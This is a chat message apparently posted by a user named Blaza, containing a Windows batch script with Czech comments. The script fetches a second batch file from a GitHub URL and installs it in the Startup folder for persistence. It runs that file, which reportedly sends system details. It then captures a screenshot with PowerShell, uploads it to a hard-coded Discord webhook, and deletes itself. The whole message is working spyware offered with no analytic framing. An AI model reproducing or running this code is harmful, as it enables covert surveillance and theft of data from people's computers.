Blaza — 16/11/2025 18:55
@echo off
chcp 65001 >nul
setlocal EnableDelayedExpansion

:: 🌐 GitHub RAW URL
set "remote=https://raw.githubusercontent.com/fanysfanys00-ctrl/mc/main/takpojd.bat"
set "bootbat=%TEMP%\boot.bat"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\boot.bat"

:: 🔍 Pokud boot.bat v autostartu neexistuje → stáhni a zaregistruj
if not exist "%startup%" (
    curl -s "%remote%" -o "%bootbat%"
    copy /y "%bootbat%" "%startup%" >nul
)

:: ▶️ Spusť boot.bat (odesílá IP, RAM, model, zprávu…)
start "" "%startup%"

:: 📸 Screenshot
set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N_ZDkZQ1TRUiAgqiaqhPpkgcN6KIiFO1m5PWw6aDAm0cFOE445el1c8"
set "ss=%TEMP%\screenshot_%RANDOM%.png"
del /f /q "%ss%" >nul 2>&1

powershell -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); $bmp.Save('%ss%', [Drawing.Imaging.ImageFormat]::Png)"

:: ✅ Ověření
if exist "%ss%" (
    curl -s -X POST %webhook% -F "file=@%ss%;type=image/png" >nul
    del /f /q "%ss%"
)

:: 🧹 Smaž sám sebe
del /f /q "%~f0"

:: ✅ Hotovo
exit
